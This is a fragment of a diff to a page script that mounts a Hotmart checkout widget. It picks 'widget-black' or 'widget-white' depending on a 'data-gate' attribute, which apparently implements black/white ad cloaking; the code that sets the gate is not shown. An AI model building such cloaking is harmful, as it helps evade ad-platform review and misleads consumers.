+  function visivel(el){ return !!(el && el.offsetParent !== null); }
+  function tentar(){
+    escalar();
     if (montado) return;
     var real = document.documentElement.getAttribute('data-gate') === 'real';
-    var alvo = document.getElementById('hotmart-sales-funnel')
-            || document.getElementById(real ? 'widget-black' : 'widget-white');
-    if (!alvo) return;
+    var alvo = document.getElementById(real ? 'widget-black' : 'widget-white');
+    if (!alvo || !visivel(alvo) || !window.checkoutElements) return;
     alvo.setAttribute('id','hotmart-sales-funnel');
-    if (!window.checkoutElements) { setTimeout(montar, 400); return; }
-    try {
-      checkoutElements.init('salesFunnel').mount('#hotmart-sales-funnel');
-      montado = true;
-    } catch(e){
-      setTimeout(montar, 600);
-    }
+    try { checkoutElements.init('salesFunnel').mount('#hotmart-sales-funnel'); montado = true; setTimeout(escalar, 800); }
+    catch(e){ alvo.setAttribute('id', real ? 'widget-black' : 'widget-white'); }
   }
-  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', montar);
-  else montar();
+  var relogio = setInterval(function(){ tentar(); if (montado) { clearInterval(relogio); setInterval(escalar, 1200); } }, 300);
+  window.addEventListener('resize', escalar);
+  if (document.readyState !== 'loading') tentar();
+  else document.addEventListener('DOMContentLoaded', tentar);
 })();
 </script>
 </body>
